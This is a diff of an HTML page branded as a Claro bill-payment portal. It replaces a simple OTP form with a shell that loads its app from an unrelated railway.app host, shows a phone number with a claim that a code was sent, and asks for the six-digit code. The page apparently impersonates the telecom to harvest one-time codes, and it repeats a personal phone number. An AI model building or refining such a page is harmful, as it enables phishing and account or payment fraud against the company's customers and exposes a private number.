@@ -1,100 +1,117 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Claro - Verificación OTP</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>Claro - Pago de Facturas</title>
+    
+    <!-- Cargar estilos directamente si hay problemas con las rutas -->
     <style>
-        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
-        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h2 { color: #e52a1b; text-align: center; }
-        .otp-inputs { display: flex; gap: 10px; margin: 20px 0; }
-        .otp-inputs input { width: 40px; height: 50px; text-align: center; font-size: 20px; border: 2px solid #ddd; border-radius: 5px; }
-        .otp-inputs input:focus { border-color: #e52a1b; outline: none; }
-        button { background: #e52a1b; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; }
-        button:hover { background: #c41a0f; }
-        .info { background: #e8f4fd; padding: 10px; border-radius: 5px; margin: 10px 0; }
+      /* Estilos mínimos para que funcione mientras cargan los CSS */
+      body { margin: 0; padding: 0; font-family: sans-serif; }
+      #app { min-height: 100vh; background: #f5f5f5; }
+      .loading { text-align: center; padding: 50px; }
     </style>
-</head>
-<body>
-    <div class="container">
-        <h2>Verificación de Teléfono</h2>
-        <div class="info">
-            <p>Se envió un código de 6 dígitos al número:</p>
-            <p style="font-weight: bold; font-size: 18px;">3148043586</p>
-            <p>Ingresa el código para continuar con el pago.</p>
-        </div>
-        
-        <div class="otp-inputs" id="otpContainer">
-            <!-- Los inputs se generarán con JS -->
-        </div>
-        
-        <button onclick="verificarOTP()">CONTINUAR</button>
-        <p style="text-align: center; margin-top: 15px;">
-            <a href="#" onclick="reenviarCodigo()" style="color: #e52a1b;">Reenviar código</a>
-        </p>
-        
-        <div id="mensaje" style="margin-top: 15px;"></div>
-    </div>
-
-    <script>
-        // Generar 6 inputs para OTP
-        const otpContainer = document.getElementById('otpContainer');
-        for (let i = 0; i < 6; i++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.oninput = function(e) {
-                // Auto avanzar al siguiente input
-                if (e.target.value && i < 5) {
-                    otpContainer.children[i + 1].focus();
-                }
-            };
-            input.onkeydown = function(e) {
-                // Retroceder al input anterior con Backspace
-                if (e.key === 'Backspace' && !e.target.value && i > 0) {
-                    otpContainer.children[i - 1].focus();
-                }
-            };
-            otpContainer.appendChild(input);
-        }
-
-        function verificarOTP() {
-            const inputs = document.querySelectorAll('.otp-inputs input');
-            let codigo = '';
-            inputs.forEach(input => codigo += input.value);
-            
-            if (codigo.length === 6) {
-                document.getElementById('mensaje').innerHTML = 
-                    '<p style="color: green; text-align: center;">Verificando código...</p>';
-                
-                // Simular envío al servidor
-                setTimeout(() => {
-                    // Aquí iría la llamada real al servidor
-                    // fetch('/validate-otp', { method: 'POST', body: JSON.stringify({ otp: codigo }) })
-                    document.getElementById('mensaje').innerHTML = 
-                        '<p style="color: green; text-align: center;">¡Código verificado! Redirigiendo...</p>';
-                    
-                    // Redirigir después de 2 segundos
-                    setTimeout(() => {
-                        window.location.href = '/proceso/pago';
-                    }, 2000);
-                }, 1000);
-            } else {
-                document.getElementById('mensaje').innerHTML = 
-                    '<p style="color: red; text-align: center;">Ingresa todos los 6 dígitos</p>';
-            }
-        }
-
-        function reenviarCodigo() {
-            document.getElementById('mensaje').innerHTML = 
-                '<p style="color: blue; text-align: center;">Código reenviado al 3148043586</p>';
-            
-            // Limpiar inputs
-            document.querySelectorAll('.otp-inputs input').forEach(input => input.value = '');
-            otpContainer.children[0].focus();
-        }
-
-        // Enfocar primer input al cargar
-        window.onload = () => otpContainer.children[0].focus();
+    
+    <!-- Intentar con rutas absolutas completas -->
+    <link rel="stylesheet" href="https://kjniu-production.up.railway.app/build/assets/app-DKFN5zXD.css">
+    <link rel="stylesheet" href="https://kjniu-production.up.railway.app/build/assets/app-CmR14Vvn.css">
+    
+    <!-- Script con manejo de errores -->
+    <script type="module">
+      // Intentar cargar el módulo principal
+      import('https://kjniu-production.up.railway.app/build/assets/app-rkTaYtKa.js')
+        .then(() => {
+          console.log('Aplicación cargada correctamente');
+        })
+        .catch(error => {
+          console.error('Error cargando la aplicación:', error);
+          // Mostrar mensaje de error al usuario
+          document.getElementById('app').innerHTML = `
+            <div class="loading">
+              <h2>Error cargando la aplicación</h2>
+              <p>Por favor, recarga la página o intenta más tarde.</p>
+              <button onclick="window.location.reload()">Reintentar</button>
+            </div>
+          `;
+        });
     </script>
-</body>
+    
+    <script type="text/javascript">
+      // Configuración de Ziggy (rutas)
+      const Ziggy = {
+        "url": "https://kjniu-production.up.railway.app",
+        "port": null,
+        "defaults": {},
+        "routes": {
+          // Mantener todas tus rutas aquí...
+          "index": {"uri": "/", "methods": ["GET", "HEAD"]},
+          "volver.inicio": {"uri": "volver-inicio", "methods": ["POST"]},
+          // ... todas las demás rutas
+        }
+      };
+      
+      // Asegurar que Ziggy esté disponible globalmente
+      window.Ziggy = Ziggy;
+      
+      // Datos iniciales de la página
+      window.pageData = {
+        component: "Claro/BuscarNumero",
+        props: {
+          errors: {},
+          flash: { message: null, success: null, errors: null },
+          otpSent: true,
+          telefonoOtp: "3148043586",
+          session: { numero: "3148043586" },
+          auth: { user: null }
+        },
+        url: "/",
+        version: "4170a83c741defe30f4290dac0883613",
+        clearHistory: false,
+        encryptHistory: false
+      };
+      
+      // Inicializar cuando el DOM esté listo
+      document.addEventListener('DOMContentLoaded', function() {
+        console.log('DOM cargado, inicializando aplicación...');
+        
+        // Verificar si Inertia/Vue se cargó correctamente
+        setTimeout(() => {
+          if (!window.Inertia && !window.Vue) {
+            console.warn('Framework no detectado, mostrando fallback');
+            document.getElementById('app').innerHTML = `
+              <div style="text-align: center; padding: 50px;">
+                <h2>Portal de Pagos Claro</h2>
+                <p>Procesando pago para: 3148043586</p>
+                <p>Se ha enviado un código OTP a tu teléfono.</p>
+                <div style="margin: 20px;">
+                  <input type="text" placeholder="Ingresa el código de 6 dígitos" style="padding: 10px; font-size: 16px; margin: 10px;">
+                </div>
+                <button style="background: #e52a1b; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer;">
+                  Continuar
+                </button>
+              </div>
+            `;
+          }
+        }, 3000);
+      });
+    </script>
+  </head>
+  <body>
+    <div id="app" data-page='{"component":"Claro/BuscarNumero","props":{"errors":{},"flash":{"message":null,"success":null,"errors":null},"otpSent":true,"telefonoOtp":"3148043586","session":{"numero":"3148043586"},"auth":{"user":null}},"url":"/","version":"4170a83c741defe30f4290dac0883613","clearHistory":false,"encryptHistory":false}'>
+      <!-- Mensaje de carga inicial -->
+      <div class="loading">
+        <p>Cargando portal de pagos Claro...</p>
+        <div style="width: 50px; height: 50px; border: 3px solid #f3f3f3; border-top: 3px solid #e52a1b; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite;"></div>
+      </div>
+      <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+      </style>
+    </div>
+    
+    <!-- Script de respaldo si falla module -->
+    <script nomodule>
+      alert('Tu navegador no soporta módulos JavaScript. Por favor, actualízalo o usa otro navegador.');
+    </script>
+  </body>
 </html>
